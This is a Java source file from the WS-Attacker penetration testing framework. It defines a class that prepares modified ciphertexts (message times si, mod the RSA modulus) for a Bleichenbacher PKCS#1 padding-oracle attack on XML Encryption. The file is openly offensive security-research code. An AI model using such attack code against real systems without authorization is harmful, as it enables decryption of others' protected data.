/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.xmlencryptionattack.attackengine.pkcs1;

import java.math.BigInteger;
import org.apache.log4j.Logger;
import wsattacker.library.xmlencryptionattack.attackengine.CryptoAttackException;
import wsattacker.library.xmlencryptionattack.attackengine.attacker.pkcs1.AttackerUtility;
import wsattacker.library.xmlencryptionattack.attackengine.attacker.pkcs1.BleichenbacherAttacker;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;

/**
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class BleichenbacherPlaintextAttacker
    extends BleichenbacherAttacker
{

    /**
     * Initialize the log4j LOG.
     */
    static Logger LOG = Logger.getLogger( BleichenbacherPlaintextAttacker.class );

    public BleichenbacherPlaintextAttacker( byte[] encryptedKey, AOracle pkcsOracle )
        throws CryptoAttackException
    {
        super( encryptedKey, pkcsOracle );
    }

    /**
     * @param originalMessage original message to be changed
     * @param si factor
     * @return
     */
    @Override
    protected byte[] prepareMsg( final BigInteger originalMessage, final BigInteger si )
    {
        byte[] msg;
        BigInteger tmp;

        if ( m_Oracle.getNumberOfQueries() % 100 == 0 )
        {
            LOG.info( "# of queries so far (plain): " + m_Oracle.getNumberOfQueries() );
        }

        // or: m*si mod n (in case of plaintext m_Oracle)
        tmp = originalMessage.multiply( si );
        tmp = tmp.mod( publicKey.getModulus() );
        // get bytes
        msg = AttackerUtility.correctSize( tmp.toByteArray(), blockSize, true );

        return msg;
    }

}
